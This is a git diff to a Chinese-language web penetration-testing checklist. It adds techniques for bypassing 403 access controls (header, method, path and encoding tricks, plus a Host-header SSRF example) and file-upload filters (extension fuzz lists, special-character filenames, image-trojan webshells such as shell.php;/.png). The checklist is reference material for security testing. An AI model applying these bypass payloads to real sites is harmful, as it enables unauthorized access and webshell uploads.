@@ -18,6 +18,88 @@
 - 目录爆破
 	- 其他端口目录爆破
 - [Bypass-403](https://github.com/iamj0ker/bypass-403) 工具
+- protocol based bypass
+    ```bash
+    http://web.com/admin    # ===> 403
+    https://web.com/admin   # ===> 200
+    ```
+- method based bypass
+    ```bash
+    OPTIONS
+    GET
+    HEAD
+    POST
+    PUT
+    DELETE
+    TRACE
+    TRACK
+    CONNECT
+    PROPFIND
+    PROPPATCH
+    MKCOL
+    COPY
+    MOVE
+    LOCK
+    UNLOCK
+    VERSION-CONTROL
+    REPORT
+    CHECKOUT
+    CHECKIN
+    UNCHECKOUT
+    MKWORKSPACE
+    UPDATE
+    LABEL
+    MERGE
+    BASELINE-CONTROL
+    MKACTIVITY
+    ORDERPATCH
+    ACL
+    PATCH
+    SEARCH
+    ARBITRARY
+    ```
+- HTTP Header based bypass
+    ```bash
+    GET /admin HTTP/1.1
+    Host: web.com   # ===> 403
+
+    GET /anything HTTP/1.1
+    Host: web.com
+    X-Original-URL: /admin  # ===> 200
+
+    GET /anything HTTP/1.1
+    Host: web.com
+    Referer: https://web.com/admin  # ===> 200
+
+    GET https://qq.com HTTP/1.1
+    Host: web.com   # ===> SSRF
+    ```
+- url character/parameter bypass
+    ```bash
+    /admin/panel    # ===> 403
+    /admin/monitor  # ===> 200
+
+    /admin/monitor/;panel   # ===> 302
+    ```
+    ```bash
+    web.com/admin   # ===> 403
+
+    web.com/ADMIN       # ===> 200
+    web.com/admin/      # ===> 200
+    web.com/admin/.     # ===> 200
+    web.com//admin//    # ===> 200
+    web.com/./admin/./  # ===> 200
+    web.com/./admin/..  # ===> 200
+    web.com/%2f/admin/  # ===> 200
+    web.com/admin.json  # ===> 200(ruby)
+
+    web.com/%2e/admin   # ===> 200
+    web.com/%252e/admin # ===> 200
+    web.com/%ef%bc%8fadmin  # ===> 200
+
+    web.com/admin       # ===> 302
+    web.com/admin..;/   # ===> 200
+    ```
 
 ## 传输过程
 
@@ -162,21 +244,32 @@
 	- Nginx 解析漏洞
 	- Apache 解析漏洞
 	- CGI 解析漏洞
-- 恶意上传 (zip、mp4 占用资源、HTML XSS 这类)
-- 恶意覆盖
-- 后缀名 Fuzz
+- 恶意上传
+	- zip、mp4 占用资源
+	- HTML XSS
+- 后缀名Fuzz
+    - [AboutSecurity/Dic/Web/Upload/](./Dic/Web/Upload)
     - web通用
         - htm
         - html
+        - shtml
     - .net
         - asp
         - aspx
         - asa
         - cer
         - cdx
+        - ashx
+        - asmx
+        - svc
+        - cshtml
+        - vbhtml
     - java
         - jsp
+        - jspa
+        - jsps
         - jspx
+        - jspf
     - php
         - php
         - php1
@@ -185,31 +278,71 @@
         - php4
         - php5
         - phtml
+    - Misc
+        - txt
+        - svg
+        - pdf
+        - xml
+        - xlsx
 - 大小写(windows)
     - `xxx.pHp`、`xxx.Jsp`
 - 空格绕过
     - `xxx .php`
     - `xxx.php `
 - 点绕过
+    - `xxx.php.`
 - 换行
     - `xxx.txt%0aphp`
+    - `xxx.ph\np`
 - .空格. 绕过(windows)
     - `xxx.php .`
-- ::$DATA(windows)
-    - `xxx.php::$DATA`
+    - `xxx.php .jpg`
+    - `xxx.php. .jpg`
+- 特殊字符
+    - `xxx.php::$DATA` (windows)
+    - `xxx.php::$DATA......` (windows)
+    - `xxx.php/`
+    - `xxx.php?`
+    - `xxx./php` (linux)
+- 特殊字符+白后缀
+    - `xxx.php.jpg`
+    - `xxx.php_.jpg`
+    - `xxx.php/1.jpg`
+    - `xxx.php{}.jpg`
+    - `xxx.php;jpg`
+    - `xxx.php;.jpg`
+    - `xxx.php;+x.jpg`
+    - `xxx.php:1.jpg`
+    - `xxx.php.123`
+    - `xxx.jpg/.php`
+    - `xxx.jpg/php`
+    - `xxx.jpg/1.php`
+    - `xxx.jpg{}.php`
 - 双写绕过
     - `phpphp.php`
     - `php.php`
     - `xxx.pphphp`
+    - `xxx.asaspxpx`
 - 00 截断
 - .htaccess
 - 中间件解析漏洞
 - 参数
     - 修改 `filename="xx.php"` 为 `filename==="xxx.php"`
     - 修改 `filename="xx.php"` 为 `filename='xxx.php'`
+    - 修改 `filename="xx.php"` 为 `filename=xxx.php`
 - 添加图片头
     - `GIF89a`
+- 恶意覆盖
+	- 覆盖资源文件造成全局XSS
+	- 覆盖配置文件修改配置
 - Content-Type Fuzz
+- 后端二次渲染
+	- 图片马
+- 访问拦截
+	- 路径
+		- `xxx.com/test/img/1.png/../../shell.php`
+	- 解析
+		- `xxx.com/shell.php;/.png`
 
 ## 下载 / 导出
 
